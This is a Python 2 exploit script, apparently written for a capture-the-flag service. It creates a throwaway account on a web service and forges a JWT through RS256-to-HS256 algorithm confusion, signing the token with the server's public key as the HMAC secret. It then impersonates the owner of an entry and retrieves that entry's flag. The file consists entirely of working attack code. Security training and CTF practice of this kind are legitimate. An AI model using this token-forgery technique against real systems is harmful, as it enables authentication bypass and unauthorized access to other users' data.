#!/usr/bin/env python2

from Crypto import Random
import binascii
import base64
import json
from Crypto.Hash import SHA256, HMAC
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
import sys
import requests
import os

def create_account(base_url, username, password):
    credentials = {
        'username': username,
        'password': password
    }
    response = requests.post(base_url + 'register/', data=json.dumps(credentials), headers={'Content-Type': 'application/json'})
    if response.status_code != requests.codes.created:
        response.raise_for_status()
    return response.json()

def get_all_entries(base_url, jwt_token):
    headers = {
        'Authorization': 'JWT ' + jwt_token
    }
    response = requests.get(base_url + 'entries/', headers=headers)
    if response.status_code != requests.codes.ok:
        response.raise_for_status()
    return response.json()

def login(base_url, username, password):
    credentials = {
        'username': username,
        'password': password
    }
    response = requests.post(base_url + 'login/', data=json.dumps(credentials), headers={'Content-Type': 'application/json'})
    if response.status_code != requests.codes.ok:
        response.raise_for_status()
    return response.json()

def get_entry(base_url, jwt_token, entry_id):
    headers = {
        'Authorization': 'JWT ' + jwt_token
    }
    response = requests.get(base_url + 'entries/' + str(entry_id), headers=headers)
    if response.status_code != requests.codes.ok:
        response.raise_for_status()
    return response.json()

def get_public_key(base_url):
    response = requests.get(base_url + 'public_key/')
    if response.status_code != requests.codes.ok:
        response.raise_for_status()
    return response.json().get('public_key')

def exploit(ip, port, flag_id):
    base_url = 'http://' + ip + ':' + str(port) + '/'
    username = (binascii.hexlify(Random.get_random_bytes(10))).decode()
    password = (binascii.hexlify(Random.get_random_bytes(10))).decode()

    account = create_account(base_url, username, password)
    jwt = login(base_url, username, password)
    jwt_token = jwt['token']

    entries = get_all_entries(base_url, jwt_token)    
    for entry in entries:
        if str(entry['id']) == flag_id:
            target_entry = entry
    
    if not target_entry:
        raise Exception("Entry with flag_id is not in the list1")
    
    (header, body, signature) = jwt_token.split('.')
    header_decoded = json.loads(base64.b64decode(header).decode())
    header_decoded['alg'] = 'HS256'
    header_payload = base64.b64encode(json.dumps(header_decoded).encode())
    body_decoded = json.loads(base64.b64decode(body).decode())
    body_decoded['username'] = target_entry['owner']
    body_payload = base64.b64encode(json.dumps(body_decoded).encode())
    to_sign = header_payload + b'.' + body_payload
    public_key = get_public_key(base_url)
    hmac = HMAC.new(public_key.encode(), to_sign, SHA256)
    payload_signature = base64.b64encode(hmac.digest())
    payload_jwt = to_sign + b'.' + payload_signature
    exploit_entry = get_entry(base_url, payload_jwt.decode(), flag_id)

    return exploit_entry['entry']
    
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: %s <ip> <flag_id>" % os.path.basename(__file__))
        sys.exit(1)
    else:
        print exploit(sys.argv[1], 20130, sys.argv[2])
